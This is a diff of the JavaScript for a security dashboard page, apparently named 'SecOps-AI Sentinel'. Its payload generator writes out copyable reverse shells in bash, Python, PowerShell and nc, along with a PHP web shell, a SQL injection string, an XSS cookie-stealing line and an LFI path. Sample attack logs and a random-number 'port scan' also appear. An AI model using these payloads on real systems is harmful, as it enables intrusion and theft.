-
-  switch (type) {
-    case 'bash': str = `bash -i >& /dev/tcp/${host}/${port} 0>&1`; break;
-    case 'python': str = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`; break;
-    case 'powershell': str = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`; break;
-    case 'php': str = `<?php system($_GET['cmd']); ?>`; break;
-    case 'nc': str = `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${host} ${port} > /tmp/f`; break;
-    case 'sqli': str = `' UNION SELECT null, username, password FROM users-- -`; break;
-    case 'xss': str = `<script>fetch('http://${host}:${port}/?cookie='+document.cookie)</script>`; break;
-    case 'lfi': str = `../../../../../../etc/passwd`; break;
-  }
-  document.getElementById('payloadOutput').textContent = str;
+  const t = document.getElementById('payloadType').value;
+  const h = document.getElementById('payloadHost').value || '10.10.14.8';
+  const p = document.getElementById('payloadPort').value || '4444';
+  let s = `bash -i >& /dev/tcp/${h}/${p} 0>&1`;
+  if (t === 'python') s = `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'`;
+  else if (t === 'powershell') s = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});..."`;
+  else if (t === 'php') s = `<?php system($_GET['cmd']); ?>`;
+  else if (t === 'sqli') s = `' UNION SELECT null, username, password FROM users-- -`;
+  document.getElementById('payloadOutput').textContent = s;
 }
-function copyPayload() { copyToClipboard(document.getElementById('payloadOutput').textContent, 'Payload copied.'); }
 
 function runRecon() {
-  const host = document.getElementById('reconHost').value.trim() || '127.0.0.1';
+  const h = document.getElementById('reconHost').value || '127.0.0.1';
   const out = document.getElementById('reconOutput');
-  const btn = document.getElementById('reconBtn');
-  btn.disabled = true;
-  out.textContent = `[+] Initiating reconnaissance against ${host}...\n`;
-
-  const ports = [21, 22, 25, 80, 443, 3306, 5432, 8080];
+  out.textContent = `[+] Scanning ${h}...\n`;
+  const ports = [21, 22, 80, 443, 3306, 8080];
   let i = 0;
-  const timer = setInterval(() => {
-    if (i >= ports.length) {
-      clearInterval(timer);
-      out.textContent += `[✓] Scan completed. Targets identified.\n`;
-      btn.disabled = false;
-      return;
-    }
-    const p = ports[i];
-    const open = Math.random() > 0.4;
-    out.textContent += `  -> Port ${p}/tcp : ${open ? 'OPEN [ACTIVE SERVICE]' : 'closed'}\n`;
-    out.scrollTop = out.scrollHeight;
+  const t = setInterval(() => {
+    if (i >= ports.length) { clearInterval(t); out.textContent += `[✓] Scan complete.\n`; return; }
+    out.textContent += `  Port ${ports[i]}/tcp: ${Math.random() > 0.4 ? 'OPEN' : 'closed'}\n`;
     i++;
-  }, 100);
+  }, 90);
 }
 function clearRecon() { document.getElementById('reconOutput').textContent = '$ ready...'; }
 
 function encodeText(type) {
-  const input = document.getElementById('encInput').value;
-  let out = '';
-  try {
-    if (type === 'base64') out = btoa(unescape(encodeURIComponent(input)));
-    else if (type === 'hex') out = [...new TextEncoder().encode(input)].map(b => b.toString(16).padStart(2,'0')).join('');
-    else if (type === 'url') out = encodeURIComponent(input);
-    else if (type === 'rot13') out = input.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
-    else if (type === 'binary') out = [...input].map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
-    document.getElementById('encOutput').textContent = out;
-  } catch (e) { document.getElementById('encOutput').textContent = 'Error: ' + e.message; }
+  const v = document.getElementById('encInput').value;
+  let o = '';
+  if (type === 'base64') o = btoa(unescape(encodeURIComponent(v)));
+  else if (type === 'hex') o = [...new TextEncoder().encode(v)].map(b => b.toString(16).padStart(2,'0')).join('');
+  else if (type === 'url') o = encodeURIComponent(v);
+  else if (type === 'rot13') o = v.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
+  document.getElementById('encOutput').textContent = o;
 }
-
 function decodeText(type) {
-  const input = document.getElementById('encInput').value;
-  let out = '';
+  const v = document.getElementById('encInput').value;
+  let o = '';
   try {
-    if (type === 'base64') out = decodeURIComponent(escape(atob(input)));
-    else if (type === 'hex') out = new TextDecoder().decode(new Uint8Array(input.match(/.{1,2}/g).map(byte => parseInt(byte, 16))));
-    else if (type === 'url') out = decodeURIComponent(input);
-    document.getElementById('encOutput').textContent = out;
+    if (type === 'base64') o = decodeURIComponent(escape(atob(v)));
+    else if (type === 'url') o = decodeURIComponent(v);
+    document.getElementById('encOutput').textContent = o;
   } catch (e) { document.getElementById('encOutput').textContent = 'Error: ' + e.message; }
 }
-function clearEncoder() { document.getElementById('encInput').value = ''; document.getElementById('encOutput').textContent = '$ output...'; }
 
 async function generateHashes() {
-  const input = document.getElementById('hashInput').value;
-  if (!input) return toast('warn', 'Empty', 'Enter string to hash.');
-  
-  const buf = new TextEncoder().encode(input);
+  const v = document.getElementById('hashInput').value;
+  if (!v) return;
+  const buf = new TextEncoder().encode(v);
   const sha256Buf = await crypto.subtle.digest('SHA-256', buf);
-  const sha1Buf = await crypto.subtle.digest('SHA-1', buf);
-  
   const sha256 = [...new Uint8Array(sha256Buf)].map(b => b.toString(16).padStart(2,'0')).join('');
-  const sha1 = [...new Uint8Array(sha1Buf)].map(b => b.toString(16).padStart(2,'0')).join('');
-
-  document.getElementById('hashOutput').innerHTML = `
-    <div style="margin-bottom:8px;"><div class="field-label">SHA-256</div><div class="code-out" style="min-height:auto;">${sha256}</div></div>
-    <div style="margin-bottom:8px;"><div class="field-label">SHA-1</div><div class="code-out" style="min-height:auto;">${sha1}</div></div>
-  `;
-}
-
-/* ============================================================
-   TERMINAL EMULATOR
-============================================================ */
-const TERMINAL_COMMANDS = {
-  help: () => {
-    termPrint('SecOps-AI Sentinel Built-in Shell:');
-    termPrint('  help             - Display command roster', 'dim');
-    termPrint('  scan <host>      - Fast SYN-probe simulation', 'dim');
-    termPrint('  hash <string>    - Compute SHA-256 of string', 'dim');
-    termPrint('  whoami           - Active user context', 'dim');
-    termPrint('  clear            - Wipe terminal buffer', 'dim');
-    termPrint('  analyze          - Switch to log analyzer view', 'dim');
-    termPrint('  banner           - Display ASCII cyber banner', 'dim');
-  },
-  clear: () => { document.getElementById('termBody').innerHTML = ''; },
-  whoami: () => { termPrint('secops-sentinel-operator (uid=0 root)', 'info'); },
-  banner: () => {
-    termPrint(`
-  ███████╗███████╗ ██████╗ ██████╗ ██████╗ ███████╗
-  ██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
-  ███████╗█████╗  ██║     ██║   ██║██████╔╝███████╗
-  ╚════██║██╔══╝  ██║     ██║   ██║██╔═══╝ ╚════██║
-  ███████║███████╗╚██████╗╚██████╔╝██║     ███████║
-    `, 'info');
-  },
-  scan: (args) => {
-    const host = args[0] || '127.0.0.1';
-    termPrint(`[+] Scanning target ${host}...`, 'warn');
-    setTimeout(() => termPrint(`[+] 22/tcp OPEN ssh`, 'info'), 200);
-    setTimeout(() => termPrint(`[+] 80/tcp OPEN http`, 'info'), 400);
-    setTimeout(() => termPrint(`[+] 443/tcp OPEN https`, 'info'), 600);
-    setTimeout(() => termPrint(`[✓] Sweep complete on ${host}.`, 'info'), 800);
-  },
-  hash: (args) => {
-    const str = args.join(' ');
-    if (!str) return termPrint('Usage: hash <string>', 'err');
-    crypto.subtle.digest('SHA-256', new TextEncoder().encode(str)).then(buf => {
-      termPrint('SHA-256: ' + [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,'0')).join(''), 'info');
-    });
-  },
-  analyze: () => switchView('analyzer')
-};
-
-function termPrint(text, cls) {
-  const body = document.getElementById('termBody');
-  const d = document.createElement('div');
-  d.className = 'term-line ' + (cls || '');
-  d.textContent = text;
-  body.appendChild(d);
-  body.scrollTop = body.scrollHeight;
+  document.getElementById('hashOutput').innerHTML = `<div class="field-label">SHA-256</div><div class="code-out">${sha256}</div>`;
 }
 
 function runTermCommand(cmd) {
-  const trimmed = cmd.trim();
-  if (!trimmed) return;
-  termPrint(`secops@sentinel:~$ ${trimmed}`, '');
+  if (!cmd.trim()) return;
+  termPrint(`secops@sentinel:~$ ${cmd}`, '');
   STATE.commands++;
   document.getElementById('statCmds').textContent = STATE.commands;
-
-  const parts = trimmed.split(/\s+/);
-  const fn = TERMINAL_COMMANDS[parts[0].toLowerCase()];
-  if (fn) fn(parts.slice(1));
-  else termPrint(`bash: command not found: ${parts[0]}. Type 'help'`, 'err');
+  const p = cmd.trim().toLowerCase().split(' ')[0];
+  if (p === 'help') termPrint('Commands: help, whoami, scan, analyze, clear, banner', 'info');
+  else if (p === 'whoami') termPrint('root@sentinel-v2 (uid=0)', 'info');
+  else if (p === 'clear') document.getElementById('termBody').innerHTML = '';
+  else if (p === 'analyze') switchView('analyzer');
+  else if (p === 'banner') termPrint('SECOPS-AI SENTINEL v2.0 - BLACK HAT EDITION', 'info');
+  else termPrint(`Command not recognized: ${p}`, 'err');
 }
 
-function clearTerminal() { document.getElementById('termBody').innerHTML = ''; }
-function downloadTerminalLog() {
-  const text = document.getElementById('termBody').innerText;
-  const blob = new Blob([text], { type: 'text/plain' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = `terminal-log-${Date.now()}.txt`;
-  a.click();
+function termPrint(t, c) {
+  const b = document.getElementById('termBody');
+  const d = document.createElement('div');
+  d.className = 'term-line ' + (c || '');
+  d.textContent = t;
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
 }
 
 /* ============================================================
-   HEX VIEWER MODAL
-============================================================ */
-function openHex() {
-  const logs = document.getElementById('logStream').value || 'NO TELEMETRY RECORDED';
-  const bytes = new TextEncoder().encode(logs);
-  const max = Math.min(1024, bytes.length);
-  let html = '';
-  for (let i = 0; i < max; i += 16) {
-    const chunk = bytes.slice(i, i + 16);
-    let hex = '', ascii = '';
-    for (let j = 0; j < 16; j++) {
-      if (j < chunk.length) {
-        hex += chunk[j].toString(16).padStart(2, '0') + ' ';
-        ascii += (chunk[j] >= 32 && chunk[j] <= 126) ? String.fromCharCode(chunk[j]) : '.';
-      } else hex += '   ';
-    }
-    html += `
-      <div class="hex-row">
-        <span class="hex-off">0x${i.toString(16).padStart(6, '0')}</span>
-        <span class="hex-bytes">${hex}</span>
-        <span class="hex-ascii">|${esc(ascii)}|</span>
-      </div>
-    `;
-  }
-  document.getElementById('hexBody').innerHTML = html;
-  document.getElementById('hexModal').classList.remove('hidden');
-}
-function closeHex() { document.getElementById('hexModal').classList.add('hidden'); }
-
-/* ============================================================
-   SAMPLES & QUICK ACTIONS
+   UTILITY & SAMPLES
 ============================================================ */
 const SCENARIOS = {
-  ssh: `Sep 17 04:12:01 edge-srv01 sshd[2841]: Failed password for invalid user admin from 185.220.101.5 port 41202 ssh2
+  ssh: `Sep 17 04:12:01 edge-srv01 sshd[2841]: Failed password for root from 185.220.101.5 port 41202 ssh2
 Sep 17 04:12:03 edge-srv01 sshd[2843]: Failed password for root from 185.220.101.5 port 41208 ssh2
-Sep 17 04:12:06 edge-srv01 sshd[2847]: Failed password for root from 185.220.101.5 port 41214 ssh2
-Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test from 185.220.101.5 port 41220 ssh2
-Sep 17 04:12:22 edge-srv01 sshd[2870]: Maximum authentication attempts exceeded for root from 185.220.101.5 port 41240 ssh2 [preauth]`,
-  sqli: `194.26.29.112 - - [17/Sep/2026:08:15:20 +0000] "GET /api/v1/products?cat=1 HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
-194.26.29.112 - - [17/Sep/2026:08:15:22 +0000] "GET /api/v1/products?cat=1%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 200 4520 "-" "sqlmap/1.6#stable"
-194.26.29.112 - - [17/Sep/2026:08:15:25 +0000] "GET /admin/login.php?user=admin%27%20OR%201=1-- HTTP/1.1" 302 512 "-" "sqlmap/1.6#stable"`,
-  ransom: `2026-09-17 11:20:01 WIN-SRV04 ProcessCreate: cmd.exe /c vssadmin.exe delete shadows /all /quiet
-2026-09-17 11:20:04 WIN-SRV04 ProcessCreate: wbadmin.exe delete catalog -quiet
-2026-09-17 11:20:10 WIN-SRV04 FileEncrypted: C:\\Shares\\Finance\\Q3_Report.xlsx.encrypted by C2_194.26.29.112`,
+Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for root from 185.220.101.5 port 41220 ssh2`,
+  sqli: `194.26.29.112 - - [17/Sep/2026:08:15:22 +0000] "GET /products?cat=1%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 200 4520 "-" "sqlmap"`,
+  ransom: `2026-09-17 11:20:01 WIN-SRV04 ProcessCreate: cmd.exe /c vssadmin.exe delete shadows /all /quiet`,
   webshell: `194.26.29.112 - - [17/Sep/2026:09:40:11 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 42 "root"`
 };
 
 function loadSample(type) {
   document.getElementById('logStream').value = SCENARIOS[type] || '';
   updateByteCount();
-  toast('info', 'Scenario Loaded', `${type.toUpperCase()} telemetry loaded into buffer.`);
+  toast('info', 'Scenario Loaded', `${type.toUpperCase()} telemetry loaded.`);
 }
 
 function quickAnalyze(type) {
   switchView('analyzer');
   loadSample(type);
-  setTimeout(runAnalysis, 350);
+  setTimeout(runAnalysis, 250);
 }
 
-/* ============================================================
-   FEED & NOTIFICATIONS
-============================================================ */
-function addFeedItem(report) {
-  const feed = document.getElementById('activityFeed');
-  const d = document.createElement('div');
-  d.className = 'feed-item';
-  d.innerHTML = `
-    <div class="icon-wrap" style="background:rgba(255,46,99,0.1);border-color:rgba(255,46,99,0.3);">
-      <i data-lucide="alert-triangle" style="width:14px;height:14px;color:var(--red);"></i>
-    </div>
-    <div style="flex:1;min-width:0;">
-      <div style="font-size:12px;font-weight:700;color:var(--text-0);">${esc(report.threat_title)}</div>
-      <div style="font-size:10px;color:var(--text-2);">${report.severity} Severity · Score: ${report.threat_score}/100</div>
-    </div>
-    <div class="num" style="font-size:10px;color:var(--text-2);">${new Date().toLocaleTimeString()}</div>
-  `;
-  feed.insertBefore(d, feed.firstChild);
-  if (window.lucide) lucide.createIcons();
-}
-function clearFeed() { document.getElementById('activityFeed').innerHTML = ''; }
-function showNotifications() { toast('info', 'Alerts', `${STATE.analyses} incident analysis record(s) queued this session.`); }
-function addTermLog(msg) { termPrint(`[${new Date().toLocaleTimeString()}] ${msg}`, 'dim'); }
-
-/* ============================================================
-   SETTINGS MANAGEMENT
-============================================================ */
-function toggleMatrix(val) {
-  if (val === 'off') window.matrixControl.stop();
-  else window.matrixControl.start();
-}
-function saveSettings() {
-  const key = document.getElementById('persistKey').value.trim();
-  localStorage.setItem('secops_key', key);
-  toast('success', 'Persisted', 'Configuration saved in localStorage.');
-}
-function resetSettings() {
-  localStorage.removeItem('secops_key');
-  document.getElementById('persistKey').value = '';
-  document.getElementById('apiKeyInput').value = '';
-  toast('info', 'Reset', 'Settings restored.');
-}
-
-/* ============================================================
-   HELPERS & BOOTSTRAP
-============================================================ */
-function esc(s) {
-  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-}
-function copyToClipboard(text, msg) {
-  if (!text) return;
-  navigator.clipboard.writeText(text).then(() => toast('success', 'Copied', msg || 'Copied to clipboard.'));
-}
 function updateByteCount() {
   const v = document.getElementById('logStream').value;
   document.getElementById('byteCount').textContent = new Blob([v]).size + ' bytes';
 }
-function clearAnalyzer() {
-  document.getElementById('logStream').value = '';
-  updateByteCount();
+function clearAnalyzer() { document.getElementById('logStream').value = ''; updateByteCount(); }
+function clearTerminal() { document.getElementById('termBody').innerHTML = ''; }
+function downloadTerminalLog() {
+  const b = new Blob([document.getElementById('termBody').innerText], { type: 'text/plain' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'terminal.txt'; a.click();
 }
-
-function toast(type, title, message) {
-  const wrap = document.getElementById('toastWrap');
+function copyPayload() { copyToClipboard(document.getElementById('payloadOutput').textContent); }
+function copyContainment() { copyToClipboard(document.getElementById('containmentOutput').textContent); }
+function copyStix() { copyToClipboard(document.getElementById('exportContent').textContent); }
+function downloadStix() {
+  const b = new Blob([document.getElementById('exportContent').textContent], { type: 'application/json' });
+  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'bundle.json'; a.click();
+}
+function copyToClipboard(t) {
+  navigator.clipboard.writeText(t).then(() => toast('success', 'Copied', 'Saved to clipboard.'));
+}
+function toast(type, title, msg) {
+  const w = document.getElementById('toastWrap');
   const d = document.createElement('div');
   d.className = `toast ${type}`;
-  d.innerHTML = `
-    <div style="flex:1;">
-      <div class="toast-title">${esc(title)}</div>
-      <div class="toast-msg">${esc(message)}</div>
-    </div>
-  `;
-  wrap.appendChild(d);
-  setTimeout(() => {
-    d.style.transition = 'all 0.3s';
-    d.style.opacity = '0';
-    d.style.transform = 'translateX(40px)';
-    setTimeout(() => d.remove(), 300);
-  }, 3800);
+  d.innerHTML = `<div><div class="toast-title">${title}</div><div class="toast-msg">${msg}</div></div>`;
+  w.appendChild(d);
+  setTimeout(() => d.remove(), 3200);
 }
+function addFeedItem(r) {
+  const f = document.getElementById('activityFeed');
+  const d = document.createElement('div');
+  d.className = 'feed-item';
+  d.innerHTML = `<div><div style="font-weight:700;">${r.threat_title}</div><div style="font-size:10px;color:var(--text-2);">${r.severity} · Score: ${r.threat_score}</div></div>`;
+  f.insertBefore(d, f.firstChild);
+}
+function clearFeed() { document.getElementById('activityFeed').innerHTML = ''; }
+function showNotifications() { toast('info', 'Queue', `${STATE.analyses} incident(s) analyzed.`); }
+function saveSettings() {
+  localStorage.setItem('secops_key', document.getElementById('persistKey').value.trim());
+  toast('success', 'Saved', 'Settings persisted.');
+}
+function resetSettings() { localStorage.removeItem('secops_key'); toast('info', 'Reset', 'Defaults restored.'); }
+function toggleMatrix(v) { if (v === 'off') window.matrixControl.stop(); else window.matrixControl.start(); }
+function openHex() { document.getElementById('hexBody').textContent = document.getElementById('logStream').value || 'No telemetry'; document.getElementById('hexModal').classList.remove('hidden'); }
+function closeHex() { document.getElementById('hexModal').classList.add('hidden'); }
+function printAudit() { window.print(); }
 
-document.addEventListener('DOMContentLoaded', () => {
-  if (window.lucide) lucide.createIcons();
+/* ============================================================
+   FAIL-SAFE BOOTSTRAP (RUNS IN ALL ENVIRONMENTS)
+============================================================ */
+function bootstrap() {
+  renderAllIcons();
   Radar.init();
 
-  // Terminal input listener
-  const termInput = document.getElementById('termInput');
-  termInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') {
-      const v = termInput.value;
-      termInput.value = '';
-      runTermCommand(v);
-    }
-  });
+  const ti = document.getElementById('termInput');
+  if (ti) {
+    ti.addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        const v = ti.value; ti.value = ''; runTermCommand(v);
+      }
+    });
+  }
 
-  // Log textarea listener
-  const logStream = document.getElementById('logStream');
-  logStream.addEventListener('input', updateByteCount);
-  logStream.addEventListener('keydown', (e) => {
-    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
-      e.preventDefault();
-      runAnalysis();
-    }
-  });
+  const ls = document.getElementById('logStream');
+  if (ls) {
+    ls.addEventListener('input', updateByteCount);
+    ls.addEventListener('keydown', e => {
+      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); runAnalysis(); }
+    });
+  }
 
-  // Global search (CTRL+K)
-  document.addEventListener('keydown', (e) => {
-    if ((e.ctrlKey || e.metaKey) && (e.key === 'k' || e.key === 'K')) {
-      e.preventDefault();
-      document.getElementById('globalSearch').focus();
-    }
-  });
+  const fi = document.getElementById('fileInput');
+  if (fi) {
+    fi.addEventListener('change', e => {
+      const f = e.target.files[0];
+      if (!f) return;
+      const r = new FileReader();
+      r.onload = ev => {
+        document.getElementById('logStream').value = ev.target.result;
+        updateByteCount();
+        document.getElementById('uploadFileName').textContent = '✓ ' + f.name;
+      };
+      r.readAsText(f);
+    });
+  }
 
-  // File upload listener
-  document.getElementById('fileInput').addEventListener('change', (e) => {
-    const f = e.target.files[0];
-    if (!f) return;
-    const reader = new FileReader();
-    reader.onload = (ev) => {
-      document.getElementById('logStream').value = ev.target.result;
-      updateByteCount();
-      document.getElementById('uploadFileName').textContent = '✓ ' + f.name;
-      toast('success', 'Artifact Ingested', f.name);
-    };
-    reader.readAsText(f);
-  });
-
-  // Initial welcome
-  termPrint('SecOps-AI Sentinel OS Shell v2.0 Armed.');
-  termPrint('Type "help" for a list of tactical utilities.');
+  document.getElementById('feedTime1').textContent = new Date().toLocaleTimeString();
+  termPrint('SecOps-AI Sentinel Terminal Initialized.');
+  termPrint('Type "help" for list of commands.');
   updateMitre(null);
   generatePayload();
-});
+}
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', bootstrap);
+} else {
+  bootstrap();
+}
 </script>
 </body>
 </html>
